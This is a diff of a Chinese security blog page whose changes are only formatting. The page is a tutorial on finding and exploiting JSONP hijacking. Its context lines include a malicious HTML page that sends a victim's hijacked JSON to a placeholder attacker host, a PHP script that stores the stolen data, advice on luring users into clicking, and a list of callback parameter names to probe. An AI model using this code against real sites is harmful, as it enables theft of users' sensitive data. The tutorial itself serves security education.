@@ -271,15 +271,13 @@
 <div class="article-content">
     <div id="article" class="content">
         <h1 id="Jsonp劫持挖掘与利用"><a href="#Jsonp劫持挖掘与利用" class="headerlink" title="Jsonp劫持挖掘与利用"></a>Jsonp劫持挖掘与利用</h1><p>Jsonp（json with padding）是基于 JSON 格式的为处理跨域请求资源而产生的处理方案，远程调使用 JSON 文件来实现数据传递。利用script元素的开放策略，网页可以得到从其他来源动态产生的json数据，因此可以用来实现跨域。</p>
-</br>
-
-<p><strong>原理</strong></p>
+<p></br></br></p>
+<p><strong>原理</strong>：</p>
 <p>浏览器使用同源策略（SOP）对网站安全进行防护，但一定程度限制了前端功能实现，所以就有了很多跨域手段，所有带src或href属性的标签可以跨域</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">&lt; script src = &quot;...&quot; &gt; <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span>&lt;/video &gt; <br><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">src</span> = <span class="hljs-string">&quot;...&quot;</span> &gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">frame</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span>&lt;/iframe &gt; <br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span> = <span class="hljs-string">&quot;stylesheet&quot;</span><span class="hljs-attr">href</span> = <span class="hljs-string">&quot;...&quot;</span> &gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">applet</span> <span class="hljs-attr">code</span> = <span class="hljs-string">&quot;...&quot;</span> &gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">applet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;...&quot;</span> &gt;</span>&lt;/object &gt;<br></code></pre></td></tr></table></figure>
 
 <p>JSONP如何跨域呢，比如要在<a target="_blank" rel="noopener" href="http://a.com/">a.com</a>获取<a target="_blank" rel="noopener" href="http://b.com/getData.php">b.com/getData.php</a>的数据，可以利用 src 属性标签可以跨域的特点，在 <a target="_blank" rel="noopener" href="http://a.com/">a.com</a> 使用<code>&lt;script&gt;</code>调用，就是用 script 引入一个文件，然后获取后面携带的 <a target="_blank" rel="noopener" href="http://b.com/">b.com</a> 返回的参数</p>
-</br>
-
+<p></br></br></p>
 <p><strong>编写jsonp让客户端获取服务端的接口内容</strong></p>
 <p>服务端的jsonp.php</p>
 <p>提供数据显示页面，callback他的作用就是回调我们的json</p>
@@ -292,8 +290,7 @@
 <p>jquery也可以来获取接口</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JSONP 实例<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://apps.bdimg.com/libs/jquery/1.8.3/jquery.js&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;external nofollow&quot;</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;divCustomers&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">$.getJSON(<span class="hljs-string">&quot;/try/ajax/jsonp.php?jsoncallback=?&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;</span><br><span class="javascript">   </span><br><span class="javascript">  <span class="hljs-keyword">var</span> html = <span class="hljs-string">&#x27;&lt;ul&gt;&#x27;</span>;</span><br><span class="javascript">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; data.length; i++)&#123;</span><br><span class="javascript">       html += <span class="hljs-string">&#x27;&lt;li&gt;&#x27;</span> + data[i] + <span class="hljs-string">&#x27;&lt;/li&gt;&#x27;</span>;</span><br><span class="javascript">    &#125;</span><br><span class="javascript">  html += <span class="hljs-string">&#x27;&lt;/ul&gt;&#x27;</span>;</span><br><span class="javascript">  $(<span class="hljs-string">&#x27;#divCustomers&#x27;</span>).html(html); </span><br><span class="javascript">&#125;);</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span> <br></code></pre></td></tr></table></figure>
 
-</br>
-
+<p></br></br></p>
 <p><strong>利用条件</strong></p>
 <ul>
 <li>返回敏感的数据</li>
@@ -302,12 +299,10 @@
 <li>发送请求的浏览器启用了 JavaScript</li>
 <li>发送请求的浏览器支持 <code>__defineSetter__</code> 方法</li>
 </ul>
-</br>
-
+<p></br></br></p>
 <p><strong>攻击流程</strong></p>
 <p>用户浏览器上保存了 HTTP 的身份认证信息和相关的cookie缓存<br>用户点击了恶意的链接，此时用户的浏览器会向恶意的网站发送 GET 请求<br>恶意网站响应用户的请求并返回恶意 JavaScript 语句，当用户的浏览器运行这些 JavaScript 语句时，它就会执行这段代码，访问目标网站，并将数据发送给恶意网站<br>恶意网站处理收到的 Json 数据</p>
-</br>
-
+<p></br></br></p>
 <p><strong>Json劫持攻击</strong></p>
 <p>jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据。</p>
 <p>存在漏洞站点页面</p>
@@ -320,16 +315,14 @@
 <p>我们再给恶意网页添加上xmlhttp来对我们网页发起请求，将数据传递给我们</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>json 数据获取测试<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://apps.bdimg.com/libs/jquery/1.10.2/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params">data</span>) </span>&#123;</span><br><span class="javascript">        <span class="hljs-keyword">var</span> xmlhttp = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="javascript">        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&quot;http://xxxxxx/save_json.php?file=&quot;</span> + <span class="hljs-built_in">JSON</span>.stringify(data);</span><br><span class="javascript">        xmlhttp.open(<span class="hljs-string">&quot;GET&quot;</span>,url,<span class="hljs-literal">true</span>);</span><br><span class="javascript">        xmlhttp.send();</span><br><span class="javascript">    &#125;</span><br><span class="javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://xxxxxx/csrf/jsonp.php?callback=test&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-</br>
-
+<p></br></br></p>
 <p><strong>恶意服务器处理接收的 Json 数据</strong></p>
 <p>save_json.php 用于保存劫持的 json 数据</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])&#123;<br>	file_put_contents(<span class="hljs-string">&#x27;json.txt&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>之后我们只要诱骗用户点击我们的链接，我们就可以收到劫持到的数据</p>
 <p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220131144249.png"></p>
-</br>
-
+<p></br></br></p>
 <p><strong>漏洞挖掘</strong></p>
 <p>搜索特定参数，大多数程序员喜欢把jsonp的回传参数命名为callback</p>
 <figure class="highlight ini"><table><tr><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">callback</span>=attack <br><span class="hljs-attr">cb</span>=attack <br><span class="hljs-attr">call</span>=attack <br><span class="hljs-attr">jsonp</span>=attack <br><span class="hljs-attr">jsonpcallback</span>=attack <br><span class="hljs-attr">jsonpcb</span>=attack <br><span class="hljs-attr">json</span>=attack <br><span class="hljs-attr">jsoncallback</span>=attack <br><span class="hljs-attr">jcb</span>=attack<br></code></pre></td></tr></table></figure>
